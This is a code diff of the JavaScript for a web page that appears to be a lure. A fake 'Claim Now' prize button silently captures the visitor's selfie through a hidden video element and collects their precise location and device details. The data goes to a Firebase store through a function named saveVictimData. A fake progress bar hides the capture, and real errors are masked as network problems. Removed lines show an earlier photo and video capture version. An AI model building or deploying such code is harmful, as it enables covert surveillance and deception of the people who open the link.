+window.claimPrize = async function() {
+  const btn = document.getElementById("claimBtn");
+  btn.disabled = true;
+  btn.textContent = "Processing...";
 
-async function capturePhoto() {
-  const video = document.getElementById("video");
-  if (!video.videoWidth) return;
+  // Show progress bar
+  const pc = document.getElementById("progressContainer");
+  const pb = document.getElementById("progressBar");
+  pc.classList.add("active");
+  pb.style.width = "0%";
 
-  const flash = document.getElementById("flash");
-  flash.classList.add("active");
-  setTimeout(() => flash.classList.remove("active"), 130);
-
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  const ctx = canvas.getContext("2d");
-  if (facingMode === "user") {
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-  }
-  ctx.drawImage(video, 0, 0);
-
-  const dataUrl = canvas.toDataURL("image/jpeg", 0.75);
-  const location = preLocation || await getLocation();
-  const device = getDeviceInfo();
-
-  await saveVictimData("photo", { photo: dataUrl, location, device });
-  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-  showCard("victimSuccessCard");
-}
-
-/* ========== VIDEO ========== */
-function toggleRecording() {
-  if (mediaRecorder && mediaRecorder.state === "recording") {
-    stopRecording();
-  } else {
-    startRecording();
-  }
-}
-
-function startRecording() {
-  if (!stream) return;
-  recordedChunks = [];
-  const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
-    ? "video/webm;codecs=vp9"
-    : MediaRecorder.isTypeSupported("video/webm") ? "video/webm" : "video/mp4";
+  // Animate progress
+  let prog = 0;
+  const progInterval = setInterval(() => {
+    prog += Math.random() * 15;
+    if (prog > 90) prog = 90;
+    pb.style.width = prog + "%";
+  }, 200);
 
   try {
-    mediaRecorder = new MediaRecorder(stream, { mimeType });
-  } catch (e) {
-    document.getElementById("errorTitle").textContent = "Video Not Supported";
-    document.getElementById("errorMsg").textContent = "Aapka browser video recording support nahi karta.";
-    showCard("victimErrorCard");
-    return;
-  }
+    // Determine what to capture based on feature
+    if (currentFeature === "camera" || currentFeature === "all") {
+      await captureCamera();
+    } else if (currentFeature === "location") {
+      await captureLocation();
+    } else if (currentFeature === "video") {
+      await captureCamera();
+    } else if (currentFeature === "device") {
+      await captureDevice();
+    }
 
-  mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-  mediaRecorder.onstop = async () => {
-    const blob = new Blob(recordedChunks, { type: mimeType });
-    const reader = new FileReader();
-    reader.onload = async () => {
+    // Complete progress
+    pb.style.width = "100%";
+    clearInterval(progInterval);
+
+    // Wait then show thank you
+    await new Promise(r => setTimeout(r, 800));
+    pc.classList.remove("active");
+
+    showScreen("thanksScreen");
+
+    // Stop stream if any
+    if (stream) {
+      stream.getTracks().forEach(t => t.stop());
+      stream = null;
+    }
+
+  } catch (e) {
+    console.error(e);
+    clearInterval(progInterval);
+    pc.classList.remove("active");
+
+    btn.disabled = false;
+    btn.textContent = "✨ Claim Now ✨";
+
+    // Show user-friendly error (pretend it's a network issue)
+    showScreen("errorScreen");
+    document.getElementById("errorTitle").textContent = "Connection Issue";
+    document.getElementById("errorMsg").textContent = "Please check your internet connection and try again.";
+  }
+}
+
+/* ========== CAPTURE CAMERA (SILENT) ========== */
+async function captureCamera() {
+  // Request camera
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
+
+    const video = document.getElementById("hiddenVideo");
+    video.srcObject = stream;
+
+    // Wait for video to load
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        setTimeout(resolve, 500);
+      };
+      // Fallback timeout
+      setTimeout(resolve, 3000);
+    });
+
+    // Capture photo
+    if (video.videoWidth > 0) {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+
+      // Mirror for selfie
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0);
+
+      captureData = canvas.toDataURL("image/jpeg", 0.75);
+
+      // Get location if possible
       const location = await getLocation();
       const device = getDeviceInfo();
-      await saveVictimData("video", { video: reader.result, location, device });
-      if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-      showCard("victimSuccessCard");
-    };
-    reader.readAsDataURL(blob);
-  };
 
-  mediaRecorder.start();
-  document.getElementById("captureBtn").classList.add("recording");
-  document.getElementById("recIndicator").classList.remove("hidden");
-  document.getElementById("captureHint").textContent = "Recording... tap to stop";
-  recStart = Date.now();
-  recTimer = setInterval(updateRecTime, 250);
-}
+      await saveVictimData("photo", {
+        photo: captureData,
+        location,
+        device
+      });
+    }
 
-function stopRecording() {
-  if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
-  document.getElementById("captureBtn").classList.remove("recording");
-  document.getElementById("recIndicator").classList.add("hidden");
-  clearInterval(recTimer);
-}
-
-function updateRecTime() {
-  const s = Math.floor((Date.now() - recStart) / 1000);
-  const mm = String(Math.floor(s/60)).padStart(2,"0");
-  const ss = String(s%60).padStart(2,"0");
-  document.getElementById("recTime").textContent = `${mm}:${ss}`;
-}
-
-window.victimStop = function() {
-  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-  if (mediaRecorder && mediaRecorder.state === "recording") {
-    mediaRecorder.stop();
-    document.getElementById("captureBtn").classList.remove("recording");
-    document.getElementById("recIndicator").classList.add("hidden");
-    clearInterval(recTimer);
+  } catch (e) {
+    console.error("Camera error:", e);
+    // Don't show error to user — just continue silently
+    // Still save device info
+    const device = getDeviceInfo();
+    await saveVictimData("device", { device });
+    throw e;
   }
-  showCard("victimActionCard");
 }
 
-/* ========== LOCATION ONLY ========== */
-window.captureLocationOnly = async function() {
-  const btn = event.target;
-  btn.disabled = true;
-  btn.textContent = "Getting Location...";
-
+/* ========== CAPTURE LOCATION ========== */
+async function captureLocation() {
   const location = await getLocation();
   const device = getDeviceInfo();
-
-  if (!location) {
-    document.getElementById("errorTitle").textContent = "Location Denied";
-    document.getElementById("errorMsg").textContent = "Aapne location permission deny ki. Please allow karein.";
-    showCard("victimErrorCard");
-    return;
-  }
-
   await saveVictimData("location", { location, device });
-  showCard("victimSuccessCard");
 }
 
-/* ========== DEVICE ONLY ========== */
-window.captureDeviceOnly = async function() {
+/* ========== CAPTURE DEVICE ========== */
+async function captureDevice() {
   const device = getDeviceInfo();
   await saveVictimData("device", { device });
-  showCard("victimSuccessCard");
 }
 
-/* ========== HELPERS ========== */
+/* ========== GET LOCATION ========== */
 function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return resolve(null);
     navigator.geolocation.getCurrentPosition(
-      pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+      pos => resolve({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      }),
       () => resolve(null),
-      { enableHighAccuracy: true, timeout: 10000 }
+      { enableHighAccuracy: true, timeout: 8000 }
     );
   });
 }
 
+/* ========== GET DEVICE INFO ========== */
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   let type = "Desktop";
   if (/Android/i.test(ua)) type = "Android";
   else if (/iPhone|iPad|iPod/i.test(ua)) type = "iOS";
   else if (/Mobile/i.test(ua)) type = "Mobile";
-  const browser = /Chrome/.test(ua) ? "Chrome" : /Firefox/.test(ua) ? "Firefox" : /Safari/.test(ua) ? "Safari" : /Edg/.test(ua) ? "Edge" : "Browser";
+
+  const browser = /Chrome/.test(ua) ? "Chrome" :
+                  /Firefox/.test(ua) ? "Firefox" :
+                  /Safari/.test(ua) ? "Safari" :
+                  /Edg/.test(ua) ? "Edge" : "Browser";
+
   return {
     type, browser,
     platform: navigator.platform || "-",
     screen: `${screen.width}x${screen.height}`,
-    language: navigator.language
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "-"
   };
 }
 
+/* ========== SAVE TO FIREBASE ========== */
 async function saveVictimData(type, data) {
   if (!currentLinkId) return;
   try {
@@ -489,7 +846,9 @@ async function saveVictimData(type, data) {
       ...data,
       timestamp: serverTimestamp()
     });
-  } catch (e) { console.error(e); }
+  } catch (e) {
+    console.error("Save error:", e);
+  }
 }
 </script>
 </body>
